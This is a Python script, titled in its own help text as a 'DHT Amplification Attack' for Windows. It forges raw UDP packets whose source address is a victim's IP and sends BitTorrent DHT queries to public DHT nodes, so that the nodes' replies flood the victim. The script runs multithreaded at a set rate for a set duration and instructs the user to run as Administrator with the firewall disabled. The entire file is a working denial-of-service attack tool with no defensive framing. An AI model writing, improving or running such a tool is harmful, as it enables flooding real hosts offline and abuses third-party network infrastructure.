#!/usr/bin/env python3

import socket
import struct
import random
import threading
import time
import argparse
from collections import OrderedDict
from hashlib import sha1
import ctypes
from ctypes import wintypes

# Windows константы
IP_HDRINCL = 2
SIO_RCVALL = 0x98000001

# Define WSADATA structure for Windows
class WSADATA(ctypes.Structure):
    _fields_ = [
        ("wVersion", wintypes.WORD),
        ("wHighVersion", wintypes.WORD),
        ("szDescription", ctypes.c_char * 257),
        ("szSystemStatus", ctypes.c_char * 129),
        ("iMaxSockets", wintypes.WORD),
        ("iMaxUdpDg", wintypes.WORD),
        ("lpVendorInfo", ctypes.c_char_p)
    ]

class DHTAmplificationWindows:
    def __init__(self):
        self.dht_nodes = []
        self.attack_running = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'responses_received': 0
        }
        self.ws2_32 = ctypes.WinDLL('ws2_32.dll')
        self.setup_windows_sockets()
    
    def setup_windows_sockets(self):
        """Инициализация Windows sockets"""
        try:
            # Инициализация Winsock с правильной структурой WSADATA
            wsa_data = WSADATA()
            result = self.ws2_32.WSAStartup(0x202, ctypes.byref(wsa_data))
            if result == 0:
                print("✓ Windows sockets initialized successfully")
            else:
                print(f"✗ WSAStartup failed with error: {result}")
        except Exception as e:
            print(f"✗ Windows sockets initialization failed: {e}")
    
    def create_spoofed_packet_windows(self, src_ip, dst_ip, src_port, dst_port, payload):
        """Создание spoofed пакета для Windows"""
        # IP заголовок
        ip_ver_ihl = 0x45
        ip_tos = 0
        ip_total_len = 20 + 8 + len(payload)
        ip_id = random.randint(0, 65535)
        ip_flags_frag = 0x4000
        ip_ttl = 128
        ip_proto = socket.IPPROTO_UDP
        ip_checksum = 0
        ip_src = struct.unpack('!I', socket.inet_aton(src_ip))[0]
        ip_dst = struct.unpack('!I', socket.inet_aton(dst_ip))[0]
        
        # IP заголовок
        ip_header = struct.pack('!BBHHHBBHII',
            ip_ver_ihl, ip_tos, ip_total_len,
            ip_id, ip_flags_frag, ip_ttl, ip_proto, ip_checksum,
            ip_src, ip_dst
        )
        
        # UDP заголовок
        udp_len = 8 + len(payload)
        udp_checksum = 0
        
        udp_header = struct.pack('!HHHH',
            src_port, dst_port, udp_len, udp_checksum
        )
        
        return ip_header + udp_header + payload
    
    def send_spoofed_windows(self, dht_node, victim_ip, victim_port, query_type="get_peers"):
        """Отправка spoofed пакета в Windows"""
        try:
            # Создаем raw socket в Windows
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            
            # Устанавливаем IP_HDRINCL для ручного контроля IP заголовков
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Создаем DHT запрос
            node_id = self.create_node_id()
            if query_type == "get_peers":
                info_hash = self.create_node_id()
                query_data = self.create_get_peers_query(node_id, info_hash)
            elif query_type == "find_node":
                target_id = self.create_node_id()
                query_data = self.create_find_node_query(node_id, target_id)
            else:
                query_data = self.create_ping_query(node_id)
            
            # Создаем spoofed пакет
            spoofed_packet = self.create_spoofed_packet_windows(
                victim_ip, dht_node[0], victim_port, dht_node[1], query_data
            )
            
            # Отправляем пакет
            sock.sendto(spoofed_packet, (dht_node[0], 0))
            
            with threading.Lock():
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(query_data)
            
            print(f"→ Sent {len(query_data)}b to {dht_node[0]}:{dht_node[1]} (as {victim_ip})")
            
            sock.close()
            return True
            
        except PermissionError:
            print("✗ Administrator privileges required on Windows")
            return False
        except OSError as e:
            if e.winerror == 10013:
                print("✗ Access denied. Run as Administrator and check firewall")
            else:
                print(f"✗ Windows socket error: {e}")
            return False
        except Exception as e:
            print(f"✗ Error: {e}")
            return False
    
    def create_node_id(self):
        return sha1(str(random.random()).encode() + str(time.time()).encode()).digest()
    
    def bencode(self, data):
        if isinstance(data, bytes):
            return str(len(data)).encode() + b':' + data
        elif isinstance(data, str):
            return self.bencode(data.encode())
        elif isinstance(data, int):
            return b'i' + str(data).encode() + b'e'
        elif isinstance(data, list):
            return b'l' + b''.join(self.bencode(item) for item in data) + b'e'
        elif isinstance(data, dict) or isinstance(data, OrderedDict):
            result = b'd'
            for key in sorted(data.keys()):
                if isinstance(key, str):
                    key = key.encode()
                result += self.bencode(key) + self.bencode(data[key])
            return result + b'e'
        else:
            raise TypeError(f"Unsupported type for bencoding: {type(data)}")
    
    def create_get_peers_query(self, node_id, info_hash):
        transaction_id = struct.pack("!H", random.randint(0, 65535))
        query = OrderedDict([
            (b"t", transaction_id),
            (b"y", b"q"),
            (b"q", b"get_peers"),
            (b"a", OrderedDict([
                (b"id", node_id),
                (b"info_hash", info_hash)
            ]))
        ])
        return self.bencode(query)
    
    def create_find_node_query(self, node_id, target_id):
        transaction_id = struct.pack("!H", random.randint(0, 65535))
        query = OrderedDict([
            (b"t", transaction_id),
            (b"y", b"q"),
            (b"q", b"find_node"),
            (b"a", OrderedDict([
                (b"id", node_id),
                (b"target", target_id)
            ]))
        ])
        return self.bencode(query)
    
    def create_ping_query(self, node_id):
        transaction_id = struct.pack("!H", random.randint(0, 65535))
        query = OrderedDict([
            (b"t", transaction_id),
            (b"y", b"q"),
            (b"q", b"ping"),
            (b"a", OrderedDict([
                (b"id", node_id)
            ]))
        ])
        return self.bencode(query)
    
    def load_nodes_from_file(self, filename="dht_nodes.txt"):
        try:
            with open(filename, 'r') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if line and not line.startswith('#'):  # Skip empty lines and comments
                        parts = line.split(':')
                        if len(parts) >= 2:
                            ip = parts[0]
                            port = parts[-1]  # Take the last part as port
                            try:
                                self.dht_nodes.append((ip, int(port)))
                                print(f"  Loaded node: {ip}:{port}")
                            except ValueError:
                                print(f"  Skipping invalid port in line {line_num}: {line}")
                        else:
                            print(f"  Skipping invalid line {line_num}: {line}")
            print(f"✓ Loaded {len(self.dht_nodes)} DHT nodes from {filename}")
            
            # If no nodes loaded, use defaults
            if not self.dht_nodes:
                print("✗ No valid nodes found, using defaults")
                self.dht_nodes = [
                    ("router.bittorrent.com", 6881),
                    ("dht.transmissionbt.com", 6881),
                ]
                
        except FileNotFoundError:
            print("✗ Nodes file not found, using defaults")
            self.dht_nodes = [
                ("router.bittorrent.com", 6881),
                ("dht.transmissionbt.com", 6881),
            ]

def main_windows():
    parser = argparse.ArgumentParser(description='DHT Amplification Attack - Windows')
    parser.add_argument('--target', '-t', required=True, help='Target IP')
    parser.add_argument('--port', '-p', type=int, default=80, help='Target port')
    parser.add_argument('--type', '-T', default='get_peers', help='Query type')
    parser.add_argument('--threads', '-th', type=int, default=5, help='Threads')
    parser.add_argument('--duration', '-d', type=int, default=30, help='Duration')
    parser.add_argument('--rate', '-r', type=int, default=5, help='Rate')
    
    args = parser.parse_args()
    
    print("🌐 DHT AMPLIFICATION - WINDOWS VERSION")
    print("⚠️  REQUIRES ADMINISTRATOR PRIVILEGES")
    print("⚠️  DISABLE WINDOWS FIREWALL FOR RAW SOCKETS")
    print("=" * 50)
    
    attack = DHTAmplificationWindows()
    attack.load_nodes_from_file()
    
    # Запуск атаки
    start_time = time.time()
    attack.attack_running = True
    
    def worker():
        while attack.attack_running and (time.time() - start_time) < args.duration:
            try:
                if attack.dht_nodes:
                    node = random.choice(attack.dht_nodes)
                    attack.send_spoofed_windows(node, args.target, args.port, args.type)
                    time.sleep(1.0 / args.rate)
                else:
                    time.sleep(0.1)
            except:
                continue
    
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        while (time.time() - start_time) < args.duration:
            elapsed = time.time() - start_time
            print(f"\rPackets: {attack.stats['packets_sent']} | Bytes: {attack.stats['bytes_sent']} | Time: {elapsed:.1f}s", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nStopped by user")
    
    attack.attack_running = False
    print(f"\nCompleted: {attack.stats['packets_sent']} packets sent")

if __name__ == "__main__":
    main_windows()